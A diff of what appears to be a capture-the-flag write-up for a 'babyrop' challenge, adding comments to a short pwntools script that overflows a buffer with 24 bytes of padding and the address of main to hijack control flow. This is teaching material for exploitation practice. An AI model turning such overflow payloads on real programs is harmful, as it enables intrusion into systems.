@@ -81,9 +81,9 @@ So our padding need to +2 and -8 to prepare the payload:
 ```python
 from pwn import *
 elf = ELF('./babyrop')
-main = elf.symbols['main']
+main = elf.symbols['main'] # Get the address of main
 p = elf.process()
-p.sendline('a'*24 + p64(main))
+p.sendline('a'*24 + p64(main)) # send the payload to execute main
 p.interactive()
 ```
 Output:
